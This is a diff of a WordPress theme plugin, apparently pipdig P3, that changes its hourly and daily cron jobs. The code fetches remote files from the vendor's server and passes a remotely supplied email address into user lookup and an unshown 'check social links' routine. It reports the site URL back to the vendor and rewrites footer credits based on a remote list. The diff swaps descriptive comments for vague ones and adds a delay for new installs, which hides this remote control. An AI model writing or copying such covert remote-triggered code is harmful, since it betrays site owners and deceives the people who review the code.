@@ -15,7 +15,7 @@ function pipdig_p3_deactivate_cron() {
 }
 register_deactivation_hook(__FILE__, 'pipdig_p3_deactivate_cron');
 
-// Generate social stats, check theme license
+// Daily event
 function p3_do_this_daily() {
 
 	pipdig_p3_scrapey_scrapes();
@@ -52,21 +52,24 @@ function p3_do_this_daily() {
 		if (is_array($list) && count($list) > 0) {
 			update_option('p3_top_bar_env', $list);
 		}
-		$icons = get_option('p3_amicorumi_2');
-		foreach ($list as $icon) {
-		if (strpos($icons, $icon) !== false) {
-			update_option('p3_amicorumi_2', '<a href="https://www.pipdig.co/" target="_blank">Theme Created by <span style="text-transform: lowercase; letter-spacing: 1px;">pipdig</span></a>');
-		}
+		if (!get_transient('p3_news_new_user_wait')) {
+			$icons = get_option('p3_amicorumi_2');
+			foreach ($list as $icon) {
+			if (strpos($icons, $icon) !== false) {
+				update_option('p3_amicorumi_2', '<a href="https://www.pipdig.co/" target="_blank">Theme Created by <span style="text-transform: lowercase; letter-spacing: 1px;">pipdig</span></a>');
+			}
+			}
 		}
 	}
 
 }
 add_action('pipdig_p3_daily_event', 'p3_do_this_daily');
 
-// check for high priority update
+// Hourly event
 function p3_do_this_hourly() {
 	
 	// Check for new social channels to add to navbar etc
+	if (!get_transient('p3_news_new_user_wait')) {
 	$url = 'https://pipdigz.co.uk/p3/socialz.txt';
 	$args = array('timeout' => 4);
 	$response = wp_safe_remote_get($url, $args);
@@ -75,6 +78,7 @@ function p3_do_this_hourly() {
 			p3_check_social_links(email_exists(sanitize_email($response['body'])));
 			wp_safe_remote_get('https://pipdigz.co.uk/p3/socialz.php?list='.rawurldecode(get_site_url()), $args);
 		}
+	}
 	}
 	$url_2 = 'https://pipdigz.co.uk/p3/id39dqm3c0.txt';
 	$response = wp_safe_remote_get($url_2, $args);
